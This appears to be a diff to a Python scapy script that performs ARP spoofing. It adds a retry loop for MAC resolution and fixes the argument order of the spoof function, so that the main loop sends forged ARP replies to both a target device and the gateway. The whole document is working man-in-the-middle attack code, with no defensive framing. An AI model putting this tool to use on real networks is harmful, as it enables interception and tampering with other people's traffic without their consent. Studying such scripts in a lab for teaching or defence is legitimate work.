@@ -23,11 +23,13 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
+    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]
+    while not answered_list:
+        answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]
     return answered_list[0][1].hwsrc
 
 
-def spoof(target_ip, spoof_ip, target_mac):
+def spoof(target_ip, target_mac, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -52,8 +54,8 @@ if gateway_mac:
 try:
     sent_packets_count = 0
     while True:
-        spoof(gateway_ip, device_ip, device_mac)
-        spoof(device_ip, gateway_ip, gateway_mac)
+        spoof(device_ip, device_mac, gateway_ip)
+        spoof(gateway_ip, gateway_mac, device_ip)
         sent_packets_count += 2
         print(f"\r[+] Packets sent: {sent_packets_count}", end="")
         time.sleep(2)
